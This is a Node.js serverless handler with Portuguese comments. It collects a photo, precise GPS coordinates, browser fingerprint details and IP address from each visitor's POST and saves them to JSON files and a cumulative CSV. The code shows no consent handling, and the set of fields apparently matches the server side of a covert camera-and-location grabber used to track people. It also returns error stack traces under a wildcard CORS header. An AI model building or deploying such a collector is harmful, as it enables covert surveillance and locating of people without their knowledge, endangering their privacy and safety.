const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');

// ===== PASTA COMPARTILHADA =====
const UPLOAD_DIR = '/tmp/uploads';

// Garante que a pasta existe
if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
    console.log('📁 Pasta /tmp/uploads criada');
}

exports.handler = async (event) => {
    console.log('📥 Coletar: Requisição recebida');
    console.log('📋 Método:', event.httpMethod);

    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ erro: 'Método não permitido' })
        };
    }

    try {
        const dados = JSON.parse(event.body);
        const id = uuidv4();
        const timestamp = Date.now();
        const dataHora = new Date().toISOString();

        console.log(`🆔 ID: ${id}`);
        console.log(`📅 Timestamp: ${dataHora}`);

        // ===== PROCESSA A FOTO =====
        let fotoSalva = false;
        let nomeFoto = null;
        let fotoBase64 = null;

        if (dados.foto && dados.foto.startsWith('data:image')) {
            try {
                // Extrai o base64 puro
                const base64Data = dados.foto.replace(/^data:image\/\w+;base64,/, '');
                const extensao = dados.foto.match(/^data:image\/(\w+);base64,/)?.[1] || 'jpg';
                nomeFoto = `foto_${id}_${timestamp}.${extensao}`;
                fotoBase64 = dados.foto; // Guarda a foto completa
                
                // Salva a foto como arquivo
                const fotoPath = path.join(UPLOAD_DIR, nomeFoto);
                fs.writeFileSync(fotoPath, base64Data, 'base64');
                fotoSalva = true;
                
                console.log(`✅ Foto salva: ${nomeFoto} (${Math.round(base64Data.length / 1024)}KB)`);
            } catch (err) {
                console.error(`❌ Erro ao salvar foto: ${err.message}`);
            }
        } else {
            console.log('⚠️ Nenhuma foto enviada');
        }

        // ===== DADOS PARA SALVAR =====
        const dadosParaSalvar = {
            id,
            timestamp: dataHora,
            localizacao: dados.localizacao || null,
            navegador: dados.navegador || null,
            ip: event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'IP não disponível',
            foto: fotoBase64, // Salva a foto completa em base64
            fotoNome: nomeFoto,
            fotoSalva: fotoSalva
        };

        // ===== SALVA O JSON =====
        const jsonPath = path.join(UPLOAD_DIR, `dados_${id}_${timestamp}.json`);
        fs.writeFileSync(jsonPath, JSON.stringify(dadosParaSalvar, null, 2));
        console.log(`💾 Dados salvos: ${jsonPath}`);

        // ===== ATUALIZA O CSV (opcional) =====
        const csvPath = path.join(UPLOAD_DIR, 'todos_dados.csv');
        const csvExiste = fs.existsSync(csvPath);
        const csvLine = [
            dataHora,
            id,
            dados.localizacao?.latitude || 'N/A',
            dados.localizacao?.longitude || 'N/A',
            dados.localizacao?.precisao || 'N/A',
            dados.navegador?.userAgent || 'N/A',
            dados.navegador?.timezone || 'N/A',
            dados.navegador?.language || 'N/A',
            event.headers['x-forwarded-for'] || 'N/A',
            fotoSalva ? 'Sim' : 'Não'
        ].join(',');

        if (!csvExiste) {
            fs.writeFileSync(csvPath, 'Data,ID,Latitude,Longitude,Precisao,UserAgent,Timezone,Idioma,IP,Foto\n' + csvLine + '\n');
        } else {
            fs.appendFileSync(csvPath, csvLine + '\n');
        }

        console.log('✅ COLETA FINALIZADA COM SUCESSO!');

        return {
            statusCode: 200,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            body: JSON.stringify({
                status: 'success',
                id: id,
                fotoSalva: fotoSalva,
                timestamp: dataHora
            })
        };

    } catch (error) {
        console.error('💥 ERRO:', error);
        return {
            statusCode: 500,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            body: JSON.stringify({ 
                erro: error.message,
                stack: error.stack 
            })
        };
    }
};
